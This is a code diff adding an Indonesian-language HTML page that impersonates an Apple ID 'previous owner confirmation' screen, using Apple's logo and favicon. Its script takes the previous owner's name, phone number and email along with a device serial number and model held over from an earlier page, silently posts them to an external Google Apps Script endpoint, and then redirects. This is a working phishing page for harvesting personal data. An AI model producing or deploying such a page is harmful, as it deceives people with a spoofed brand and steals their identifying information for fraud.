@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi Informasi Pemilik - Apple ID</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="https://www.apple.com/favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png" alt="Apple Logo" class="logo">
+            <h1>Konfirmasi Informasi Pemilik Sebelumnya</h1>
+            <p class="subtitle">Silakan isi informasi berikut untuk membantu proses verifikasi Anda.</p>
+            
+            <form id="ownerInfoForm">
+                <div class="input-group">
+                    <input type="text" name="previousOwner" id="previousOwner" required placeholder=" ">
+                    <label for="previousOwner">Nama Pemilik Sebelumnya</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="tel" name="phoneNumber" id="phoneNumber" required placeholder=" ">
+                    <label for="phoneNumber">Nomor Telepon Terakhir yang Digunakan</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="email" name="previousEmail" id="previousEmail" placeholder=" ">
+                    <label for="previousEmail">Alamat Email Sebelumnya (opsional)</label>
+                </div>
+                
+                <button type="submit">Lanjutkan</button>
+            </form>
+            
+            <div class="links">
+                <a href="#">Bantuan</a>
+                <a href="#">Hubungi Apple Support</a>
+                <a href="#">Privacy Policy</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('ownerInfoForm');
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Get form data
+                const previousOwner = document.getElementById('previousOwner').value;
+                const phoneNumber = document.getElementById('phoneNumber').value;
+                const previousEmail = document.getElementById('previousEmail').value;
+                
+                // Store data in sessionStorage
+                sessionStorage.setItem('previousOwner', previousOwner);
+                sessionStorage.setItem('phoneNumber', phoneNumber);
+                sessionStorage.setItem('previousEmail', previousEmail);
+                
+                // Get device info from previous page
+                const serialNumber = sessionStorage.getItem('serialNumber') || '';
+                const deviceModel = sessionStorage.getItem('deviceModel') || '';
+                
+                // Store all data in Google Sheets if we have a script URL
+                const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbynLQMeGItAFOfJeOgwpk6mZKP3z9nUWn4aBWtD1fu0w4QenZLDpg96_3YRYOP_Mbki/exec';
+                
+                if (GOOGLE_SCRIPT_URL) {
+                    try {
+                        // Prepare data
+                        const data = {
+                            timestamp: new Date().toISOString(),
+                            serialNumber: serialNumber,
+                            deviceModel: deviceModel,
+                            previousOwner: previousOwner,
+                            phoneNumber: phoneNumber,
+                            previousEmail: previousEmail
+                        };
+                        
+                        // Send to Google Sheets
+                        fetch(GOOGLE_SCRIPT_URL, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            cache: 'no-cache',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data)
+                        });
+                        
+                        console.log('Data terkirim!');
+                    } catch (error) {
+                        console.error('Error:', error);
+                    }
+                }
+                
+                // Redirect to next page
+                window.location.href = 'done.html';
+            });
+        });
+    </script>
+</body>
+</html> 
